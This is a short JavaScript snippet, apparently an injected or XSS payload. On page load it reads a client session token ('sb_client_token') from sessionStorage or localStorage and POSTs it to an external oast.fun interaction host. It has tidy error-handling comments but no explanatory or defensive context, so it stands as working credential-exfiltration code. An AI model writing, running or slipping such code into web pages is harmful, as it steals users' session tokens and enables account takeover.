document.addEventListener("DOMContentLoaded", () => {
    // Quick online check (not perfect, but helps)
    if (!navigator.onLine) {
        console.warn("Browser reports offline—no point trying the request.");
        return;
    }

    const sessionToken = sessionStorage.getItem("sb_client_token");
    const localToken = localStorage.getItem("sb_client_token");
    const token = sessionToken || localToken;

    if (token) {
        // AbortController for timeout (5s here—adjust as needed)
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);

        fetch("https://rddllovzousqsobdgdtx9y20oju9plvex.oast.fun", {
            method: "POST",
            signal: controller.signal, // For aborting on timeout
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ token: token }),
        })
        .then(response => {
            clearTimeout(timeoutId); // Clear timeout if successful
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            return response.json();
        })
        .then(data => {
            console.log("Token sent successfully:", data);
            // Do something with success if needed
        })
        .catch(error => {
            clearTimeout(timeoutId); // Just in case
            console.error("Token send failed:", error);
            if (error.name === 'AbortError') {
                console.error("Request timed out—DNS or network too slow.");
            } else if (error.message.includes('ERR_NAME_NOT_RESOLVED')) {
                console.error("DNS resolution failed—domain might not exist or network issue.");
                // Optional: Log to a real endpoint or analytics
            } else {
                console.error("General fetch error:", error.message);
            }
        });
    } else {
        console.log("No token found in session/local storage—skipping request.");
    }
});
